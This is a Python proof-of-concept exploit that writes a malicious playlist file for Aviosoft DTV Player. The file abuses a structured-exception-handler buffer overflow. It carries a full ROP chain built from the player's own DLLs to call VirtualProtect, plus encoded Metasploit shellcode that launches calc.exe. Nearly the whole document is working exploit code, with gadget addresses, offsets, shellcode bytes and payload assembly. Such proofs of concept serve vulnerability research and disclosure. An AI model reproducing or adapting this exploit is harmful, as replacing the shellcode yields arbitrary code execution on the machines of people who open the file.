# How to use this poc?
# Run the Aviosoft DTV Player --> Open --> Open playlist --> adtv-bug.plf --> will call calc.exe
# Let's the poc begin..

#!/usr/bin/python

import struct
file = 'adtv-bug.plf'

junk = 'A' * 72

#we don't need nseh
seh = struct.pack('<L', 0x61309594)	# ADD ESP,454 # RETN    ** [DTVDeviceManager.dll]
rop = struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x6405347a)	# POP EDX # RETN 	** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x10011108)	# ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]
rop+= struct.pack('<L', 0x64010503)	# PUSH EDX # POP EAX # POP ESI # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x6160949f)	# MOV ECX,DWORD PTR DS:[EDX] # POP ESI # POP EBP # MOV DWORD PTR DS:[EAX],ECX # POP EBX # RETN 0C    ** [EPG.dll]
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x61604218)	# PUSH ECX # ADD AL,5F # XOR EAX,EAX # POP ESI # RETN 0C    ** [EPG.dll]
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x6403d1a6)	# POP EBP # RETN [MediaPlayerCtrl.dll] 
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x60333560)	# & push esp #  ret 0c [Configuration.dll]
rop+= struct.pack('<L', 0x61323EA8)	# POP EAX # RETN    ** [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0xA13977DF)	# 0x00000343-> ebx
rop+= struct.pack('<L', 0x640203fc)	# ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x6163d37b)	# PUSH EAX # ADD AL,5E # POP EBX # RETN    ** [EPG.dll]
rop+= struct.pack('<L', 0x61626807)	# XOR EAX,EAX # RETN    ** [EPG.dll]
rop+= struct.pack('<L', 0x640203fc)	# ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x6405347a)	# POP EDX # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0xA13974DC)	# 0x00000040-> edx
rop+= struct.pack('<L', 0x613107fb)	# ADD EDX,EAX # MOV EAX,EDX # RETN    ** [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x60326803)	# POP ECX # RETN [Configuration.dll] 
rop+= struct.pack('<L', 0x60350340)	# &Writable location [AviosoftDTV.exe]
rop+= struct.pack('<L', 0x61329e07)	# POP EDI # RETN [DTVDeviceManager.dll] 
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x60340178)	# POP EAX # RETN ** [Configuration.dll] 
rop+= struct.pack('<L', 0x90909090)	# nop
rop+= struct.pack('<L', 0x60322e02)	# PUSHAD # RETN [Configuration.dll] 

nop = '\x90' * 32
# ./msfpayload windows/exec CMD=calc R | msfencode -t c -e x86/alpha_upper -b '\x00\0a\x1a'
# [*] x86/alpha_mixed succeeded with size 461 (iteration=1)

shellcode = ("\x89\xe3\xdb\xdd\xd9\x73\xf4\x58\x50\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4c\x49\x43\x30"
"\x45\x50\x45\x50\x45\x30\x4b\x39\x4b\x55\x56\x51\x58\x52\x52"
"\x44\x4c\x4b\x51\x42\x50\x30\x4c\x4b\x51\x42\x54\x4c\x4c\x4b"
"\x56\x32\x54\x54\x4c\x4b\x54\x32\x51\x38\x54\x4f\x4f\x47\x51"
"\x5a\x47\x56\x50\x31\x4b\x4f\x50\x31\x49\x50\x4e\x4c\x47\x4c"
"\x45\x31\x43\x4c\x45\x52\x56\x4c\x47\x50\x49\x51\x58\x4f\x54"
"\x4d\x43\x31\x4f\x37\x4b\x52\x4c\x30\x56\x32\x50\x57\x4c\x4b"
"\x51\x42\x52\x30\x4c\x4b\x51\x52\x47\x4c\x43\x31\x58\x50\x4c"
"\x4b\x47\x30\x52\x58\x4c\x45\x49\x50\x54\x34\x51\x5a\x45\x51"
"\x58\x50\x50\x50\x4c\x4b\x51\x58\x54\x58\x4c\x4b\x56\x38\x47"
"\x50\x43\x31\x58\x53\x4b\x53\x47\x4c\x47\x39\x4c\x4b\x56\x54"
"\x4c\x4b\x45\x51\x49\x46\x56\x51\x4b\x4f\x50\x31\x49\x50\x4e"
"\x4c\x4f\x31\x58\x4f\x54\x4d\x45\x51\x58\x47\x56\x58\x4b\x50"
"\x54\x35\x4b\x44\x54\x43\x43\x4d\x4c\x38\x47\x4b\x43\x4d\x56"
"\x44\x52\x55\x4d\x32\x51\x48\x4c\x4b\x50\x58\x56\x44\x43\x31"
"\x4e\x33\x43\x56\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x58\x45"
"\x4c\x45\x51\x49\x43\x4c\x4b\x45\x54\x4c\x4b\x45\x51\x4e\x30"
"\x4d\x59\x51\x54\x56\x44\x51\x34\x51\x4b\x51\x4b\x45\x31\x56"
"\x39\x50\x5a\x56\x31\x4b\x4f\x4b\x50\x50\x58\x51\x4f\x51\x4a"
"\x4c\x4b\x54\x52\x5a\x4b\x4d\x56\x51\x4d\x52\x4a\x43\x31\x4c"
"\x4d\x4b\x35\x58\x39\x43\x30\x43\x30\x45\x50\x56\x30\x45\x38"
"\x50\x31\x4c\x4b\x52\x4f\x4d\x57\x4b\x4f\x58\x55\x4f\x4b\x5a"
"\x50\x4e\x55\x49\x32\x50\x56\x52\x48\x4f\x56\x4c\x55\x4f\x4d"
"\x4d\x4d\x4b\x4f\x4e\x35\x47\x4c\x43\x36\x43\x4c\x54\x4a\x4b"
"\x30\x4b\x4b\x4d\x30\x52\x55\x45\x55\x4f\x4b\x50\x47\x52\x33"
"\x52\x52\x52\x4f\x43\x5a\x43\x30\x51\x43\x4b\x4f\x4e\x35\x52"
"\x43\x43\x51\x52\x4c\x52\x43\x43\x30\x41\x41")

sisa = 'C' * 4124
junk2 = 'B' * (872 - len(rop+junk+nop+shellcode))

payload = junk+rop+nop+shellcode+junk2+seh+sisa

f = open(file,'w')
print "Author: modpr0be"
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()
